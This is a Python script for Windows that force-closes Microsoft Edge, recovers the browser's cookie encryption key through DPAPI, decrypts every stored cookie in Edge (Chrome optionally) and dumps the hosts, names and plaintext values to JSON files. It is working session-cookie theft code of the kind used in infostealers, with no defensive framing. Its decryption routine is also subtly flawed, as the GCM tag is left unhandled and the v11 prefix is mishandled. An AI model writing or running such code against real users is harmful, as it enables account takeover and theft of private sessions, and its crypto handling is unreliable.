import os
import sqlite3
import json
import base64
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import time

def close_browser(browser_name):
    try:
        # Check if the browser is running
        tasklist_output = os.popen(f'tasklist | findstr /I {browser_name}.exe').read()
        if browser_name.lower() in tasklist_output.lower():
            print(f"{browser_name} is running. Closing it...")
            os.system(f'taskkill /F /IM {browser_name}.exe')
        else:
            print(f"{browser_name} is not running.")
    except Exception as e:
        print(f"Error: {e}")

def get_encryption_key(browser):
    paths = {
        "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Local State",
        "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
    }
    
    local_state_path = paths.get(browser)
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State file not found: {local_state_path}")
    
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_cookie(encrypted_value, key):
    try:
        if encrypted_value[:3] in [b'v10', b'v20']:  # AES-GCM encrypted (v10/v20)
            iv = encrypted_value[3:15]
            encrypted_value = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_value)
            return decrypted.decode("utf-8", errors="ignore")

        elif encrypted_value[:3] == b'v11':  # AES-CBC encrypted (older versions)
            iv = encrypted_value[3:15]
            encrypted_value = encrypted_value[15:]
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted_value)
            return decrypted[:-decrypted[-1]].decode("utf-8", errors="ignore")  # Remove padding

        else:
            return encrypted_value.decode("utf-8", errors="ignore")  # Plaintext cookie

    except Exception as e:
        print(f"[ERROR] Decryption failed: {e}")
        return "[Failed to decrypt]"


def extract_cookies(browser):
    paths = {
        "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies",
        "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Network\Cookies"
    }
    
    db_path = paths.get(browser)
    if not os.path.exists(db_path):
        raise FileNotFoundError(f"Cookies database not found: {db_path}")
    
    key = get_encryption_key(browser)
    
    # Copy database to avoid permission issues
    temp_db = "cookies_temp.db"
    shutil.copy2(db_path, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    
    cookies = []
    encrypted_cookies = []
    for host, name, encrypted_value in cursor.fetchall():
        print(f"Processing cookie: {name} for {host}")
        decrypted_value = decrypt_cookie(encrypted_value, key)
        
        cookies.append({
            "host": host,
            "name": name,
            "value": decrypted_value
        })
        encrypted_cookies.append({
            "host": host,
            "name": name,
            "encrypted_value": base64.b64encode(encrypted_value).decode("utf-8")
        })
    
    conn.close()
    os.remove(temp_db)
    
    with open(f"{browser}_cookies.json", "w") as file:
        json.dump(cookies, file, indent=4)
    
    with open(f"{browser}_encrypted_cookies.json", "w") as enc_file:
        json.dump(encrypted_cookies, enc_file, indent=4)

    print(f"{browser.capitalize()} cookies saved to {browser}_cookies.json")
    print(f"{browser.capitalize()} encrypted cookies saved to {browser}_encrypted_cookies.json")

# Run script

#close_browser("chrome")  # Check and close Google Chrome
close_browser("msedge")  # Check and close Microsoft Edge

time.sleep(3)

#extract_cookies("chrome")
extract_cookies("edge")
